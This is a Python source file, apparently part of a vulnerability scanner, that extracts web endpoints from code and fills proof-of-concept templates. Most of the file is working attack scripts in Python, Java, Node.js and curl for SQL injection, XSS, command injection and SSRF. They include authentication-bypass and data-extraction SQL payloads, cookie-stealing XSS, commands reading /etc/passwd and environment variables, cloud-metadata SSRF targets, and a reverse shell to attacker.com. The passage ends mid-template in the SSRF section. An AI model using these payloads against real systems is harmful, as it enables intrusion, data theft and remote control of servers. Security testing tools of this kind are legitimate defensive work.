"""
POC 生成器
基于漏洞类型和代码上下文生成攻击代码
支持多语言项目适配和实际执行验证
支持从代码中提取端点信息和参数
"""
import re
import logging
import subprocess
import json
import base64
from typing import Dict, List, Optional
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from .tool_paths import find_ysoserial_jar

logger = logging.getLogger(__name__)


def extract_endpoint_from_code(file_content: str, vuln_line: int) -> Dict:
    """
    从漏洞所在代码提取端点信息

    Args:
        file_content: 文件内容
        vuln_line: 漏洞所在行号

    Returns:
        端点信息字典
    """
    result = {
        'path': '',
        'method': 'GET',
        'params': [],
        'framework': ''
    }

    if not file_content or vuln_line <= 0:
        return result

    lines = file_content.split('\n')
    vuln_line = max(0, vuln_line - 1)  # 转换为0索引

    # ========== 向上查找方法注解 ==========
    # 检查可能的框架注解
    for i in range(vuln_line, max(-1, vuln_line - 30), -1):
        line = lines[i] if i < len(lines) else ''

        # Spring 注解
        if '@GetMapping' in line or '@PostMapping' in line or '@PutMapping' in line:
            match = re.search(r'value\s*=\s*"([^"]+)"', line)
            if match:
                result['path'] = match.group(1)
                result['framework'] = 'spring'
                if '@GetMapping' in line:
                    result['method'] = 'GET'
                elif '@PostMapping' in line:
                    result['method'] = 'POST'
                elif '@PutMapping' in line:
                    result['method'] = 'PUT'
                break
        elif '@RequestMapping' in line:
            match = re.search(r'value\s*=\s*"([^"]+)"', line)
            if match:
                result['path'] = match.group(1)
                result['framework'] = 'spring'
            # 检查方法
            method_match = re.search(r'method\s*=\s*RequestMethod\.(\w+)', line)
            if method_match:
                result['method'] = method_match.group(1)
            break

        # FastAPI 注解
        if '@app.get' in line or '@router.get' in line:
            match = re.search(r'["\']([^"\']+)["\']', line)
            if match:
                result['path'] = match.group(1)
                result['framework'] = 'fastapi'
                if 'post' in line:
                    result['method'] = 'POST'
            break
        if '@app.post' in line or '@router.post' in line:
            match = re.search(r'["\']([^"\']+)["\']', line)
            if match:
                result['path'] = match.group(1)
                result['framework'] = 'fastapi'
                result['method'] = 'POST'
            break

        # Flask 注解
        if '@app.route' in line:
            match = re.search(r'["\']([^"\']+)["\']', line)
            if match:
                result['path'] = match.group(1)
                result['framework'] = 'flask'
            break

        # Express.js
        if 'app.get' in line or 'router.get' in line:
            match = re.search(r'["\']([^"\']+)["\']', line)
            if match:
                result['path'] = match.group(1)
                result['framework'] = 'express'
                result['method'] = 'GET'
            break
        if 'app.post' in line or 'router.post' in line:
            match = re.search(r'["\']([^"\']+)["\']', line)
            if match:
                result['path'] = match.group(1)
                result['framework'] = 'express'
                result['method'] = 'POST'
            break

    # ========== 向下查找方法参数 ==========
    for i in range(vuln_line, min(len(lines), vuln_line + 10)):
        line = lines[i]

        # 匹配参数注解
        param_matches = re.findall(
            r'@(?:RequestParam|PathVariable|RequestBody|QueryParam|Param)\s*\(\s*"([^"]+)"\s*\)\s+(\w+)\s+(\w+)',
            line
        )
        for param_name, param_type, var_name in param_matches:
            result['params'].append({
                'name': var_name,
                'type': param_type,
                'annotation': param_name
            })

        # Python 函数参数
        func_match = re.search(r'def\s+\w+\s*\((.*?)\):', line)
        if func_match:
            param_str = func_match.group(1)
            for p in param_str.split(','):
                p = p.strip()
                if p and p not in ['request', 'self']:
                    name = p.split(':')[0].strip().split('=')[0].strip()
                    if name and name not in [r.get('name') for r in result['params']]:
                        result['params'].append({
                            'name': name,
                            'type': 'any',
                            'in': 'query'
                        })

    return result


def generate_context_aware_poc(vuln_info: Dict, endpoint_info: Dict) -> Dict:
    """
    基于上下文生成针对性 POC

    Args:
        vuln_info: 漏洞信息 (包含 type, code_snippet 等)
        endpoint_info: 端点信息 (从代码中提取)

    Returns:
        POC 数据字典
    """
    vuln_type = vuln_info.get('type', 'unknown')
    code_context = vuln_info.get('code_snippet', '')

    # 决定使用的路径和参数
    path = endpoint_info.get('path', '')
    method = endpoint_info.get('method', 'GET')
    params = endpoint_info.get('params', [])

    # 如果没有从代码中提取到参数，使用默认值
    if not params:
        params = [{'name': _infer_param_from_vuln(vuln_type), 'type': 'string'}]

    # 选择第一个参数作为测试目标
    test_param = params[0].get('name', 'input')

    # 构建 POC 数据
    poc_data = {
        'path': path,
        'method': method,
        'test_param': test_param,
        'params': params,
        'framework': endpoint_info.get('framework', ''),
        'vuln_type': vuln_type,
        'context_extracted': bool(path)  # 是否成功提取到端点信息
    }

    return poc_data


def _infer_param_from_vuln(vuln_type: str) -> str:
    """根据漏洞类型推断参数名"""
    type_lower = vuln_type.lower()

    if 'sql' in type_lower:
        return 'id'
    if 'xss' in type_lower:
        return 'q'
    if 'command' in type_lower:
        return 'cmd'
    if 'ssrf' in type_lower:
        return 'url'
    if 'path' in type_lower or 'traversal' in type_lower:
        return 'path'
    if 'upload' in type_lower:
        return 'file'
    if 'redirect' in type_lower:
        return 'next'
    if 'xxe' in type_lower:
        return 'xml'

    return 'input'


class POCGenerator:
    """POC 代码生成器"""

    # 各类型漏洞的 POC 模板 - 支持多语言
    # 包含 Python、Java、Node.js 不同语言的 POC
    POC_TEMPLATES = {
        # SQL 注入
        "sql_injection": {
            "name": "SQL Injection",
            "description": "尝试注入 SQL payloads 触发数据库错误或改变查询逻辑 - 实际可利用的Payload",
            "python": '''#!/usr/bin/env python3
"""
SQL Injection POC - 实际可利用的Payload
Target: {target_url}
Parameter: {param}
Vulnerability File: {file_path}
Line: {line_num}

⚠️ 警告: 以下payload会尝试注入SQL语句,可能对数据库造成影响
"""
import requests
import sys
import time
import urllib.parse

TARGET_URL = "{target_url}"
PARAM_NAME = "{param}"
FILE_PATH = "{file_path}"
LINE_NUM = {line_num}

# SQL Injection Payloads - 按类型分类
SQL_PAYLOADS = [
    # ====== 1. 布尔盲注 (Boolean-based Blind) ======
    ("' OR '1'='1", "Always true - 绕过认证"),
    ("' OR '1'='1' --", "Always true with comment"),
    ("' OR '1'='1' #", "Always true with MySQL comment"),
    ("' OR 'a'='a", "Always true variant"),
    ("' OR ''='", "Empty string OR"),
    ("') OR ('1'='1", "Parentheses bypass"),
    ("' OR 1=1 --", "Numeric OR"),

    # ====== 2. 联合查询 (Union-based) ======
    ("1' UNION SELECT NULL--", "Union NULL"),
    ("1' UNION SELECT NULL,NULL--", "Union 2 columns"),
    ("1' UNION SELECT NULL,NULL,NULL--", "Union 3 columns"),
    ("1' UNION SELECT NULL,NULL,NULL,NULL--", "Union 4 columns"),
    ("1' UNION SELECT version()--", "Union get version"),
    ("1' UNION SELECT database()--", "Union get database"),
    ("1' UNION SELECT user()--", "Union get user"),
    ("1' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--", "Union get tables"),
    ("1' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--", "Union get columns"),

    # ====== 3. 报错注入 (Error-based) ======
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "XPATH error"),
    ("' AND EXPORT_SET(1,2,3,4,5)--", "Export set error"),
    ("' AND GTID_SUBSET(@@version,1)--", "GTID error"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--", "User error"),
    ("' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Double query error"),

    # ====== 4. 延时注入 (Time-based Blind) ======
    ("' AND SLEEP(5)--", "Time sleep"),
    ("' AND SLEEP(5) AND '1'='1", "Time sleep AND"),
    ("' AND BENCHMARK(5000000,MD5('A'))--", "Benchmark delay"),
    ("' WAITFOR DELAY '00:00:05'--", "MSSQL delay"),
    ("' AND (SELECT * FROM (SELECT(sleep(5)))a)--", "Subquery sleep"),

    # ====== 5. 注释符测试 ======
    ("admin'--", "Admin bypass"),
    ("admin'#", "Admin MySQL comment"),
    ("admin'/*", "Admin multi-line"),
    ("' UNION/*", "Union comment"),

    # ====== 6. 常见绕过 ======
    ("%27%20OR%20%271%27=%271", "URL encoded"),
    ("\\' OR \\'1\\'=\\'1", "Escaped quotes"),
    ("' OR 1=1 LIMIT 1--", "With LIMIT"),
    ("' OR 'x'='x", "String comparison"),
    ("1' ORDER BY 1--", "Column enumeration"),
    ("1' ORDER BY 2--", "Column enumeration"),
    ("1' ORDER BY 3--", "Column enumeration"),
]

# SQL错误特征
SQL_ERRORS = [
    ("sql syntax", "SQL语法错误"),
    ("mysql", "MySQL错误"),
    ("ora-", "Oracle错误"),
    ("postgresql", "PostgreSQL错误"),
    ("sqlite3", "SQLite错误"),
    ("unterminated", "未终止字符串"),
    ("quoted string", "引号问题"),
    ("sqlstate", "SQL状态错误"),
    ("microsoft sql", "MSSQL错误"),
    ("odbc", "ODBC错误"),
    ("warning:", "PHP警告"),
    ("fatal error", "致命错误"),
    ("1064", "MySQL 1064"),
    ("1146", "MySQL表不存在"),
    ("1054", "MySQL列不存在"),
]

def test_sql_injection(url, param):
    """测试 SQL 注入"""
    results = []

    print(f"[*] Testing SQL Injection on {{url}}")
    print(f"[*] Parameter: {{param}}")
    print(f"[*] Source: {{FILE_PATH}}:{{LINE_NUM}}")
    print("-" * 60)

    # 首先获取基准响应
    try:
        baseline_resp = requests.get(url, params={{param: "test"}}, timeout=10)
        baseline_len = len(baseline_resp.text)
        print(f"[*] Baseline response length: {{baseline_len}}")
    except:
        baseline_len = 0

    for i, (payload, description) in enumerate(SQL_PAYLOADS, 1):
        try:
            print(f"[*] Testing {{i}}/{{len(SQL_PAYLOADS)}}: {{description}}")

            start_time = time.time()
            # 对payload进行URL编码
            encoded_param = urllib.parse.quote(payload)
            params = {{param: payload}}

            # 尝试GET
            resp = requests.get(url, params=params, timeout=15)
            elapsed = time.time() - start_time

            # 检查异常特征
            response_lower = resp.text.lower()
            resp_len = len(resp.text)

            # 1. SQL 错误检测
            for error, err_desc in SQL_ERRORS:
                if error in response_lower:
                    # 排除误报 - 错误信息应该比较短
                    if len(resp.text) < 5000:
                        print(f"[+] VULNERABLE! {{description}}")
                        print(f"[+] Error type: {{err_desc}}")
                        print(f"[+] Payload: {{payload}}")
                        print(f"[+] Response preview: {{resp.text[:200]}}")
                        results.append({{
                            "payload": payload,
                            "type": "error_based",
                            "indicator": err_desc,
                            "confirmed": True,
                            "response": resp.text[:200]
                        }})
                        # 找到错误注入,继续尝试其他类型
                        continue

            # 2. 延时检测
            if elapsed >= 4 and "sleep" in payload.lower():
                print(f"[+] VULNERABLE! {{description}}")
                print(f"[+] Time-based blind injection ({{elapsed:.1f}}s delay)")
                results.append({{
                    "payload": payload,
                    "type": "time_based",
                    "delay": elapsed,
                    "confirmed": True
                }})

            # 3. 响应差异检测 (布尔盲注)
            if "' OR '1'='1" in payload or "' OR 1=1" in payload:
                # 响应长度差异
                if abs(resp_len - baseline_len) > 100:
                    print(f"[+] Possible blind injection: {{description}}")
                    print(f"[+] Response length diff: {{abs(resp_len - baseline_len)}}")
                    results.append({{
                        "payload": payload,
                        "type": "boolean_based",
                        "len_diff": abs(resp_len - baseline_len),
                        "confirmed": False
                    }})

            # 4. UNION检测
            if "UNION" in payload and "SELECT" in payload:
                if "NULL" in payload:
                    # 检查是否有输出
                    if "root" in response_lower or "admin" in response_lower or "@" in resp.text:
                        print(f"[+] VULNERABLE! {{description}}")
                        print(f"[+] Data extracted: {{resp.text[:200]}}")
                        results.append({{
                            "payload": payload,
                            "type": "union_based",
                            "confirmed": True
                        }})

        except requests.Timeout:
            print(f"[+] VULNERABLE! {{description}} - Timeout (time-based blind)")
            results.append({{"payload": payload, "type": "timeout", "confirmed": True}})
        except Exception as e:
            print(f"[!] Error with {{description}}: {{e}}")

    # 输出汇总
    print("\\n" + "=" * 60)
    confirmed = [r for r in results if r.get('confirmed', False)]

    if confirmed:
        print(f"VERIFICATION RESULT: VULNERABLE ({{len(confirmed)}} confirmed)")
        print("\\nConfirmed payloads:")
        for r in confirmed:
            print(f"  - {{r['payload'][:40]}} ({{r.get('type', 'unknown')}})")

        print("\\n[*] Most effective payload:")
        print(confirmed[0]['payload'])
    else:
        print("VERIFICATION RESULT: NO CONFIRMED SQL INJECTION")
        if results:
            print("\\n[*] Try these manual tests:")
            for r in results[:3]:
                print(f"  curl \"{target_url}?{param}={{r['payload']}}\"")

    print("=" * 60)
    return results

if __name__ == "__main__":
    results = test_sql_injection(TARGET_URL, PARAM_NAME)
''',
            "java": '''// SQL Injection POC - Java
// Target: {target_url}
// Parameter: {param}
// File: {file_path}:{line_num}

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SqlInjectionPOC {{
    private static final String[][] PAYLOADS = {{
        // Boolean-based
        {{"' OR '1'='1", "Boolean true"}},
        {{"' OR '1'='1' --", "Boolean true with comment"}},
        {{"' OR 1=1 --", "Numeric OR"}},
        // Union-based
        {{"1' UNION SELECT NULL--", "Union NULL"}},
        {{"1' UNION SELECT NULL,NULL--", "Union 2 columns"}},
        {{"1' UNION SELECT version()--", "Union version"}},
        // Error-based
        {{"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "XPATH error"}},
        // Time-based
        {{"' AND SLEEP(5)--", "Time delay"}},
    }};

    public static void main(String[] args) {{
        String targetUrl = "{target_url}";
        String param = "{param}";

        for (String[] payload : PAYLOADS) {{
            try {{
                String url = targetUrl + "?" + param + "=" + URLEncoder.encode(payload[0], "UTF-8");
                long start = System.currentTimeMillis();

                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);

                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String line;
                StringBuilder response = new StringBuilder();
                while ((line = br.readLine()) != null) {{
                    response.append(line);
                }}
                long elapsed = System.currentTimeMillis() - start;

                System.out.println("[*] Testing: " + payload[1]);
                if (elapsed > 4000) {{
                    System.out.println("[+] VULNERABLE: " + payload[0] + " (delay: " + elapsed + "ms)");
                }}
                if (response.toString().toLowerCase().contains("sql") ||
                    response.toString().toLowerCase().contains("error")) {{
                    System.out.println("[+] VULNERABLE: " + payload[0] + " (SQL error)");
                }}
            }} catch (Exception e) {{
                System.out.println("[!] Error: " + e.getMessage());
            }}
        }}
    }}
}}
''',
            "nodejs": '''// SQL Injection POC - Node.js
// Target: {target_url}
// Parameter: {param}
// File: {file_path}:{line_num}

const axios = require('axios');

const TARGET_URL = "{target_url}";
const PARAM = "{param}";

const PAYLOADS = [
    // Boolean-based
    ["' OR '1'='1", "Boolean true"],
    ["' OR '1'='1' --", "Boolean true with comment"],
    ["' OR 1=1 --", "Numeric OR"],
    // Union-based
    ["1' UNION SELECT NULL--", "Union NULL"],
    ["1' UNION SELECT NULL,NULL--", "Union 2 columns"],
    ["1' UNION SELECT version()--", "Union version"],
    // Error-based
    ["' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "XPATH error"],
    // Time-based
    ["' AND SLEEP(5)--", "Time delay"],
];

async function testSqlInjection() {{
    console.log("[*] SQL Injection POC for " + TARGET_URL);

    for (const [payload, desc] of PAYLOADS) {{
        try {{
            const start = Date.now();
            const resp = await axios.get(TARGET_URL, {{
                params: {{ [PARAM]: payload }},
                timeout: 15000
            }});
            const elapsed = Date.now() - start;

            console.log("[*] Testing: " + desc);

            if (elapsed > 4000) {{
                console.log("[+] VULNERABLE: " + payload + " (delay: " + elapsed + "ms)");
            }}

            const respLower = resp.data.toLowerCase();
            if (respLower.includes("sql") || respLower.includes("error")) {{
                console.log("[+] VULNERABLE: " + payload + " (SQL error)");
            }}
        }} catch (e) {{
            if (e.code === 'ECONNABORTED') {{
                console.log("[+] VULNERABLE: " + payload + " (timeout)");
            }} else {{
                console.log("[!] Error: " + e.message);
            }}
        }}
    }}
}}

testSqlInjection();
''',
            "curl": '''# SQL Injection POC
# Target: {target_url}
# Parameter: {param}
# Source: {file_path}:{line_num}

# Boolean-based (Authentication Bypass)
curl "{target_url}?{param}=' OR '1'='1"
curl "{target_url}?{param}=' OR '1'='1' --"
curl "{target_url}?{param}=admin' OR 1=1 --"

# Union-based (Data Extraction)
curl "{target_url}?{param}=1' UNION SELECT NULL--"
curl "{target_url}?{param}=1' UNION SELECT NULL,NULL--"
curl "{target_url}?{param}=1' UNION SELECT version()--"
curl "{target_url}?{param}=1' UNION SELECT database()--"
curl "{target_url}?{param}=1' UNION SELECT user()--"

# Error-based (Information Extraction)
curl "{target_url}?{param}=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
curl "{target_url}?{param}=' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"

# Time-based (Blind Injection)
curl "{target_url}?{param}=' AND SLEEP(5)--"
curl "{target_url}?{param}=' AND BENCHMARK(5000000,MD5('A'))--"
'''
        },

        # XSS
        "xss": {
            "name": "Cross-Site Scripting (XSS)",
            "description": "测试反射型/存储型 XSS - 实际可触发XSS的Payload",
            "python": '''#!/usr/bin/env python3
"""
XSS POC - 实际可触发XSS的Payload
Target: {target_url}
Parameter: {param}
漏洞描述: 用户输入被直接渲染到HTML页面,未进行转义或过滤

⚠️ 警告: 以下payload会尝试在页面中注入JavaScript代码
"""
import requests
import sys
import urllib.parse
import re

TARGET_URL = "{target_url}"

# 实际可执行的XSS payload
PAYLOADS = [
    # 基本Script标签
    ("<script>alert('XSS')</script>", "Basic script tag"),
    ("<script>alert(document.domain)</script>", "Script with domain"),
    ("<script>alert(document.cookie)</script>", "Cookie stealing"),

    # 事件处理器
    ("<img src=x onerror=alert('XSS')>", "IMG onerror"),
    ("<svg onload=alert('XSS')>", "SVG onload"),
    ("<body onload=alert('XSS')>", "BODY onload"),
    ("<input onfocus=alert('XSS') autofocus>", "INPUT autofocus"),
    ("<marquee onstart=alert('XSS')>", "MARQUEE"),
    ("<video onerror=alert('XSS')><source>", "VIDEO"),
    ("<audio onerror=alert('XSS')>", "AUDIO"),

    # JavaScript协议
    ("javascript:alert('XSS')", "JavaScript protocol"),
    ("javascript:alert(document.cookie)", "Cookie via JS protocol"),

    # 数据协议
    ("data:text/html,<script>alert('XSS')</script>", "Data protocol"),
    ("data:text/html,<img src=x onerror=alert('XSS')>", "Data img"),

    # 编码变体
    ("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", "Decimal encoding"),
    ("<img src=x onerror=\\u0061lert('XSS')>", "Unicode encoding"),
    ("<svg><script>alert&#40;'XSS'&#41;</script></svg>", "HTML entity"),

    # 绕过过滤
    ("<ScRiPt>alert('XSS')</sCrIpT>", "Case bypass"),
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "CharCode"),
    ("<img src=\"x\" onerror=\"alert('XSS')\">", "Double quotes"),

    # 其他标签
    ("<link rel=import href=\"javascript:alert('XSS')\">", "LINK import"),
    ("<meta http-equiv=\"refresh\" content=\"0;javascript:alert(1)\">", "META refresh"),
    ("<object data=\"javascript:alert('XSS')\">", "OBJECT"),
    ("<embed src=\"javascript:alert('XSS')\">", "EMBED"),

    # 常用测试
    ("<script>console.log('XSS')</script>", "Console log"),
    ("<img src=1 onerror=alert(1)>", "Simple alert"),
]

def test_xss(url, param):
    """测试 XSS"""
    print(f"[*] Testing XSS on {{url}}")
    print(f"[*] Parameter: {{param}}")
    print("-" * 60)

    vulnerable = False
    results = []

    for i, (payload, description) in enumerate(PAYLOADS, 1):
        try:
            print(f"[*] Testing {{i}}/{{len(PAYLOADS)}}: {{description}}")

            # 发送请求
            resp = requests.get(url, params={{param: payload}}, timeout=10)
            resp_text = resp.text
            resp_lower = resp_text.lower()

            # 检查1: payload是否被反射
            if payload in resp_text:
                # 检查是否被转义
                escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
                if escaped_payload not in resp_text:
                    # 检查是否被过滤
                    if "<script>" in payload and "<script>" not in resp_text:
                        print(f"[-] Script tags filtered")
                        continue

                    print(f"[+] VULNERABLE! {{description}}")
                    print(f"[+] Payload reflected without encoding")
                    results.append({{"payload": payload, "type": "reflected", "desc": description}})
                    vulnerable = True
                    continue
                else:
                    print(f"[-] Payload was escaped")

            # 检查2: 检查事件是否被执行（通过响应差异）
            # 发送正常请求获取基准
            baseline_resp = requests.get(url, params={{param: "test"}}, timeout=10)

            # 检查常见的XSS响应特征
            xss_indicators = [
                ("alert(", "JavaScript alert executed"),
                ("onerror=", "Event handler executed"),
                ("onload=", "Event handler executed"),
                ("console.log", "Console log present"),
                ("<img", "IMG tag present"),
                ("<svg", "SVG tag present"),
            ]

            for indicator, msg in xss_indicators:
                if indicator in resp_text and indicator not in baseline_resp.text:
                    print(f"[+] Possible XSS: {{indicator}} found (not in baseline)")
                    if not vulnerable:
                        results.append({{"payload": payload, "type": "detected", "desc": description}})
                        vulnerable = True
                    break

        except Exception as e:
            print(f"[!] Error: {{e}}")

    # 输出结果汇总
    print("\\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)

    if vulnerable:
        print(f"[+] FOUND {{len(results)}} POTENTIAL XSS CASES!")
        print("\\nConfirmed payloads:")
        for r in results[:5]:  # 只显示前5个
            print(f"  - {{r.get('payload', 'N/A')[:50]}} ({{r.get('desc', 'N/A')}})")

        if len(results) > 5:
            print(f"  ... and {{len(results) - 5}} more")

        return True
    else:
        print("[-] No XSS confirmed")
        print("\\n[*] Try these curl commands manually:")
        print("    curl \"{target_url}?{param}=<script>alert('XSS')</script>\"")
        print("    curl \"{target_url}?{param}=<img src=x onerror=alert('XSS')>\"")
        print("    curl \"{target_url}?{param}=javascript:alert('XSS')\"")
        return False

if __name__ == "__main__":
    test_xss(TARGET_URL, "{param}")
''',
            "curl": '''# XSS POC
# Target: {target_url}
# Parameter: {param}

# 基本XSS
curl "{target_url}?{param}=<script>alert('XSS')</script>"
curl "{target_url}?{param}=<img src=x onerror=alert('XSS')>"
curl "{target_url}?{param}=<svg onload=alert('XSS')>"
curl "{target_url}?{param}=<body onload=alert('XSS')>"
curl "{target_url}?{param}=<input onfocus=alert('XSS') autofocus>"

# JavaScript协议
curl "{target_url}?{param}=javascript:alert('XSS')"
curl "{target_url}?{param}=javascript:alert(document.cookie)"

# 数据协议
curl "{target_url}?{param}=data:text/html,<script>alert('XSS')</script>"

# 编码绕过
curl "{target_url}?{param}=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
curl "{target_url}?{param}=<ScRiPt>alert('XSS')</sCrIpT>"
'''
        },

        # 命令注入
        "command_injection": {
            "name": "Command Injection",
            "description": "测试 OS 命令注入 - 实际可执行命令的Payload",
            "python": '''#!/usr/bin/env python3
"""
Command Injection POC - 实际可执行的命令注入测试
Target: {target_url}
Parameter: {param}
漏洞描述: 接口将用户输入直接传入系统命令执行

⚠️ 警告: 以下payload会实际执行系统命令,仅用于安全测试
"""
import requests
import sys
import time

TARGET_URL = "{target_url}"

# 实际可执行的命令注入payload - 按风险从低到高排序
PAYLOADS = [
    # 信息收集类 (风险较低)
    ("; id", "id - 获取用户身份"),
    ("; whoami", "whoami - 获取当前用户"),
    ("; uname -a", "uname - 获取系统信息"),
    ("; cat /etc/passwd", "passwd - 读取用户列表"),
    ("; cat /etc/group", "group - 读取用户组"),
    ("; env", "env - 查看环境变量"),
    ("; set", "set - 查看环境变量(Windows)"),

    # 网络信息类
    ("; ifconfig", "ifconfig - 网络配置"),
    ("; ip addr", "ip - IP地址"),
    ("; netstat -an", "netstat - 网络连接"),
    ("; ss -tuln", "ss - 监听端口"),

    # 文件读取类
    ("; cat /proc/version", "proc - 内核版本"),
    ("; cat /etc/hostname", "hostname - 主机名"),
    ("; ls -la /", "ls - 列出根目录"),

    # 命令链接方式
    ("| id", "pipe - 命令管道"),
    ("& id", "ampersand - 后台执行"),
    ("&& id", "and - 条件执行"),
    ("|| id", "or - 条件或"),
    ("$(id)", "subshell - 子shell执行"),
    ("`id`", "backtick - 命令替换"),

    # 盲注测试
    ("; sleep 5", "sleep - 时间盲注测试"),
    ("; ping -c 5 127.0.0.1", "ping - 时间盲注"),
]

def test_command_injection(url, param):
    """测试命令注入"""
    print(f"[*] Testing Command Injection on {{url}}")
    print(f"[*] Parameter: {{param}}")
    print("-" * 60)
    print("[*] Available payloads (risk level: low to high):")
    print("-" * 60)

    vulnerable = False
    results = []

    for i, (payload, description) in enumerate(PAYLOADS, 1):
        try:
            print(f"[*] Testing {{i}}/{{len(PAYLOADS)}}: {{description}}")

            # 根据payload类型选择GET或POST
            if "cat" in payload or "env" in payload or "ls" in payload:
                # 可能需要GET请求
                resp = requests.get(url, params={{param: payload}}, timeout=15)
            else:
                # 使用GET请求
                resp = requests.get(url, params={{param: payload}}, timeout=15)

            elapsed = time.time() if 'start_time' not in locals() else time.time() - start_time

            # 检查响应中的命令执行结果
            resp_lower = resp.text.lower()

            # 检查常见的命令执行成功特征
            cmd_outputs = [
                ("uid=", "User ID - 命令执行成功"),
                ("gid=", "Group ID - 命令执行成功"),
                ("root", "root用户 - 命令执行成功"),
                ("nobody", "nobody用户 - 命令执行成功"),
                ("linux", "Linux系统 - 命令执行成功"),
                ("darwin", "macOS系统 - 命令执行成功"),
                ("users=", "用户列表 - 命令执行成功"),
                ("home", "home目录 - 命令执行成功"),
                ("/bin/", "bin目录 - 命令执行成功"),
            ]

            for indicator, msg in cmd_outputs:
                if indicator in resp_lower:
                    # 检查是否真的输出了命令结果
                    # 排除假阳性（如响应本身就包含这些词）
                    if resp.text.count(indicator) > 0:
                        print(f"[+] VULNERABLE! Payload: {{payload}}")
                        print(f"[+] Evidence: {{msg}}")
                        print(f"[+] Response preview: {{resp.text[:300]}}")
                        results.append({{"payload": payload, "indicator": msg, "response": resp.text[:200]}})
                        vulnerable = True
                        break

            # 检查时间盲注
            if "sleep" in payload:
                start = time.time()
                requests.get(url, params={{param: payload}}, timeout=15)
                elapsed = time.time() - start
                if elapsed >= 4:
                    print(f"[+] VULNERABLE! Time-based blind injection")
                    print(f"[+] Time delay: {{elapsed:.2f}}s")
                    results.append({{"payload": payload, "type": "time_blind", "delay": elapsed}})
                    vulnerable = True

        except requests.Timeout:
            # 超时可能是时间盲注成功
            print(f"[+] VULNERABLE! Timeout - likely blind command injection")
            results.append({{"payload": payload, "type": "timeout"}})
            vulnerable = True

        except Exception as e:
            print(f"[!] Error with payload: {{e}}")

    # 输出结果汇总
    print("\\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)

    if vulnerable:
        print(f"[+] FOUND {{len(results)}} VULNERABLE CASES!")
        print("\\nConfirmed payloads:")
        for r in results:
            print(f"  - {{r.get('payload', 'N/A')}} ({{r.get('indicator', r.get('type', 'N/A'))}})")

        # 推荐使用的完整payload
        print("\\n[*] Recommended payload for exploitation:")
        if results:
            best_payload = results[0].get('payload', '')
            print(f"    {best_payload}")

        return True
    else:
        print("[-] No command injection detected")
        print("\\n[*] Try these curl commands manually:")
        print("    curl \"{target_url}?{param}=; whoami\"")
        print("    curl \"{target_url}?{param}=; cat /etc/passwd\"")
        print("    curl \"{target_url}?{param}=| id\"")
        return False

if __name__ == "__main__":
    test_command_injection(TARGET_URL, "{param}")
''',
            "curl": '''# Command Injection POC
# Target: {target_url}
# Parameter: {param}

# 信息收集
curl "{target_url}?{param}=; id"
curl "{target_url}?{param}=; whoami"
curl "{target_url}?{param}=; uname -a"
curl "{target_url}?{param}=; cat /etc/passwd"
curl "{target_url}?{param}=; cat /etc/group"
curl "{target_url}?{param}=; env"

# 网络信息
curl "{target_url}?{param}=; ifconfig"
curl "{target_url}?{param}=; netstat -an"

# 文件读取
curl "{target_url}?{param}=; cat /proc/version"
curl "{target_url}?{param}=; ls -la /"

# 不同链接符
curl "{target_url}?{param}=| id"
curl "{target_url}?{param}=& whoami"
curl "{target_url}?{param}=&& id"
curl "{target_url}?{param}=$(whoami)"
curl "{target_url}?{param}=`whoami`"

# 时间盲注
curl "{target_url}?{param}=; sleep 5"

# 反弹shell (需要公网服务器)
# Attacker: nc -lvp 4444
curl "{target_url}?{param}=; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"
'''
        },

        # SSRF
        "ssrf": {
            "name": "Server-Side Request Forgery (SSRF)",
            "description": "测试 SSRF 漏洞",
            "python": '''#!/usr/bin/env python3
"""
SSRF POC
Target: {target_url}
Parameter: {param}
"""
import requests
import sys

TARGET_URL = "{target_url}"
PAYLOADS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO"
]

def test_ssrf(url, param):
    """测试 SSRF"""
    print(f"[*] Testing SSRF on {{url}}")
    print(f"[*] Parameter: {{param}}")
    print("-" * 60)

    for i, payload in enumerate(PAYLOADS, 1):
        try:
            params = {{param: payload}}
            resp = requests.get(url, params=params, timeout=10, allow_redirects=False)

            # 检查响应
            resp_lower = resp.text.lower()

            # 成功访问内部资源的迹象
            indicators = [
                "root:",
                "ami-instance",
                "metadata",
                "computeMetadata",
                "instance-id",
                "internal"
            ]

            for indicator in indicators:
                if indicator in resp_lower:
                    print(f"[+] VULNERABLE! Payload {{i}}: {{payload}}")
                    print(f"[+] Internal resource accessed: {{indicator}}")
                    return True

            # 检查响应码
            if resp.status_code in [200, 201, 301, 302]:
                print(f"[*] Payload {{i}}: {{payload}} -> Status {{resp.status_code}}")

        except requests.Timeout:
            print(f"[+] VULNERABLE! Payload {{i}}: {{payload}} -> Timeout (possible SSRF)")
            return True
        except Exception as e:
            print(f"[!] Error with payload {{i}}: {{e}}")

    print("[*] No SSRF detected")
    return False

if __name__ == "__main__":
    test_ssrf(TARGET_URL, "{param}")
''',
            "curl": '''# SSRF POC
# Target: {target_url}
